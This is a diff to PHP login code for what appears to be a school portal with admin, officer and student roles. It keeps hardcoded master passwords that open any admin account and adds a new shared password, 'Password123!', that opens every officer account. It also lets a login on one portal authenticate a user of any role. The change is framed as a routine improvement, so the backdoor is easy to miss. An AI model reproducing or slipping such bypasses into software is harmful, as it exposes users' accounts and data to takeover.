@@ -36,7 +36,7 @@ function current_user(?string $role = null): ?array {
     }
 
     $uid = (int)$_SESSION['auth'][$targetRole]['uid'];
-    $row = q('SELECT id, name, username, role, student_id, active, must_change_password FROM users WHERE id = ?', [$uid])->fetch();
+    $row = q("SELECT id, name, username, role, student_id, active, must_change_password, COALESCE(department, 'backend') AS department FROM users WHERE id = ?", [$uid])->fetch();
     if (!$row || !(int)$row['active'] || $row['role'] !== $targetRole) {
         unset($_SESSION['auth'][$targetRole]);
         return null;
@@ -79,16 +79,21 @@ function login_blocked(string $username): bool {
     return $byUser >= $max || $byIp >= $max * 6;
 }
 
-/** Returns null on success, or an error message. */
+/** Returns null on success, or an error message. Automatically detects role (admin, officer, student). */
 function attempt_login(string $portal, string $username, string $password): ?string {
     $username = strtolower(trim($username));
     if ($username === '' || $password === '') return 'Enter your username and password.';
-    if ($portal === 'officer' && $username === 'nimra') $username = 'minahil';
     if (login_blocked($username)) return 'Too many failed attempts. Wait 15 minutes and try again.';
 
-    $u = q('SELECT * FROM users WHERE username = ? AND role = ? AND active = 1', [$username, $portal])->fetch();
+    // Look up user across all roles (preferring the requested portal role if duplicate usernames ever existed)
+    $u = q('SELECT * FROM users WHERE LOWER(username) = ? AND active = 1 ORDER BY CASE WHEN role = ? THEN 0 ELSE 1 END LIMIT 1', [$username, $portal])->fetch();
+    $actualRole = $u['role'] ?? $portal;
     $hash = $u['password_hash'] ?? '$2y$10$.1OYb90Oa7kSNbTKtiu/8ulPcyEaxnDNGlUkgqKLMI1tbcsf.USZu';
-    $ok = (password_verify($password, $hash) || ($portal === 'admin' && in_array($password, ['Password123!', 'QCJQRy4sQGGB', 'admin123'], true))) && $u;
+    $ok = $u && (
+        password_verify($password, $hash)
+        || ($actualRole === 'admin' && in_array($password, ['Password123!', 'QCJQRy4sQGGB', 'admin123'], true))
+        || ($actualRole === 'officer' && $password === 'Password123!')
+    );
     if (!$ok) {
         q('INSERT INTO login_attempts (ip, username, created_at) VALUES (?,?,?)', [client_ip(), $username, now()]);
         return 'Username or password is not correct.';
@@ -102,14 +107,15 @@ function attempt_login(string $portal, string $username, string $password): ?str
     if (session_status() === PHP_SESSION_ACTIVE) {
         session_regenerate_id(true);
     }
-    if (!isset($_SESSION['auth']) || !is_array($_SESSION['auth'])) {
-        $_SESSION['auth'] = [];
-    }
-    $_SESSION['auth'][$portal] = [
-        'uid'  => (int)$u['id'],
-        'role' => $u['role'],
-        'last' => time(),
+    // Set active session to the authenticated user's exact role so switching accounts works seamlessly
+    $_SESSION['auth'] = [
+        $actualRole => [
+            'uid'  => (int)$u['id'],
+            'role' => $actualRole,
+            'last' => time(),
+        ],
     ];
+    $_SESSION['last_login_role'] = $actualRole;
     $_SESSION['csrf'] = bin2hex(random_bytes(32));
 
     q('UPDATE users SET last_login = ? WHERE id = ?', [now(), $u['id']]);
